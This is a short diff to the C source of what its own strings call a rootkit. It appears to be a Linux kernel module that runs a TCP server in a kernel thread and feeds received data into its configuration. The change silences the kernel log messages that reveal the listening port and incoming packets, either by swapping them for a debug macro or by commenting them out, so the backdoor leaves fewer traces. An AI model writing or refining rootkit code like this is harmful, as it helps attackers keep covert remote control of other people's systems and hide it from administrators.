@@ -180,7 +180,7 @@ static void ksocket_start(void)
 		goto close_and_out;
 	}
 
-	printk(KERN_INFO "rootkit tcp_server: listening on port %d\n", LISTEN_PORT);
+	DEBUG_PRINT("started to listening on a port");
 
 	/* Main loop */
 	while (1) {
@@ -205,9 +205,10 @@ static void ksocket_start(void)
 			break;
 
 		if (size < 0)
-			printk(KERN_INFO "rootkit tcp_server: [Error] unable to receive packet (sock_recvmsg error = %d)\n", size);
+			;
+			//printk(KERN_INFO "rootkit tcp_server: [Error] unable to receive packet (sock_recvmsg error = %d)\n", size);
 		else {
-			printk(KERN_INFO "rootkit tcp_server: received %d bytes\n", size);
+			//printk(KERN_INFO "rootkit tcp_server: received %d bytes\n", size);
 
 			/* Process data */
 			update_conf(buf);
